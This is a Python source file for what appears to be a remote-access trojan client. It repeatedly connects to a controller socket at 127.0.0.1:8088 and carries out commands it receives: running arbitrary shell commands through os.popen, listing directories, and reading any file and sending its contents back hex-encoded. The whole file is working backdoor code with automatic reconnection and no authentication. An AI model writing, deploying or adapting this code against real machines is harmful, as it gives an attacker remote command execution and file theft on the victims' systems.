import socket
import base64
import json
import time
import os

from pydantic import DecimalIsNotFiniteError

# Send dynamic length socket data
def send_dyn_socket(server, content):
    send_data = json.dumps({
                'type': 'data',
                'content': content
            }).encode()
    server.send(json.dumps({
        'type': 'length',
        'content': len(send_data)
    }).encode())
    while True:
        recv_data = server.recv(2048).decode()
        json_data = json.loads(recv_data)
        if json_data['type'] == 'okay':
            server.send(send_data)
            break
        else:
            continue


def exec_shell(server, command): # Execute shell command
    console_return = "".join(os.popen(command).readlines())
    send_dyn_socket(server, console_return)


def scan_dir(server, path): # Scan directory
    scan_result = os.listdir(path)
    dir_list = list()
    file_list = list()
    for direntry in scan_result:
        sub_path = path + os.path.sep + direntry
        if os.path.isfile(sub_path):
            file_list.append(direntry)
        elif os.path.isdir(sub_path):
            dir_list.append(direntry)
    entire_dir = list((dir_list, file_list))
    send_dyn_socket(server, entire_dir)


def download_file(server, filepath):
    if os.path.exists(filepath):
        print(filepath)
        buf = bytearray(os.path.getsize(filepath))
        with open(filepath, 'rb') as file:
            file.readinto(buf)
        print(buf)
        send_dyn_socket(server, buf.hex())
    else:
        send_dyn_socket(server, 'File does not exists')


def tcpClient(client):
    while True:
        try:
            recv_data = client.recv(2048).decode()
            json_data = json.loads(recv_data)
            match json_data['type']:
                case 'heartbeat':
                    continue
                case 'shell':
                    exec_shell(client, json_data['content'])
                case 'scandir':
                    scan_dir(client, json_data['content'])
                case 'downfile':
                    download_file(client, json_data['content'])
        except:
            client.close()
            connect()
            return


def connect():
    host = '127.0.0.1'
    port = 8088
    try:
        client = socket.socket()
        client.connect((host, port))
        print('server connected')
        tcpClient(client)
    except:
        time.sleep(1)
        connect()


if __name__ == '__main__':
    connect()
